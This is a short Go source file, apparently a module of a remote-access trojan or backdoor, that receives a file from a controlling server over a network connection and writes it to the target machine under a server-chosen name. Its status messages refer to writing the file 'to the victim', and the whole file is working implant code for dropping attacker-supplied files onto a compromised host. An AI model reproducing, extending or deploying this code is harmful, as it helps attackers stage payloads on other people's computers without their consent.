package download

import (
	"encoding/gob"
	"fmt"
	"net"
	"os"
)

type FileStruct struct {
	FileName    string
	FileSize    int
	FileContent []byte
}

func DownloadFromServer(connection net.Conn) (err error) {
	decoder := gob.NewDecoder(connection)

	fs := &FileStruct{}
	err = decoder.Decode(fs)
	if err != nil {
		fmt.Println(err)
		return err
	}
	file, err := os.Create(fs.FileName)
	if err != nil {
		fmt.Println("[-] Unable to create file: ", err)
	}
	defer file.Close()

	nbytes, err := file.Write(fs.FileContent)
	if err != nil {
		fmt.Println("[-] failed to write file: ", err)
	} else {
		fmt.Println("[+] Number of bytes written ", nbytes)
	}

	var status string
	if checkExistence(fs.FileName) {
		status = "[+] Successfully written File"
	} else {
		status = "[-] Unable to write file to the victim"
	}

	_, err = connection.Write([]byte(status + "\n"))
	if err != nil {
		fmt.Println("[-] Unable to write in connection: ", err)
	}

	return nil
}

func checkExistence(fileName string) bool {
	if _, err := os.Stat(fileName); err != nil {
		if os.IsNotExist(err) {
			return false
		}
	}
	return true
}
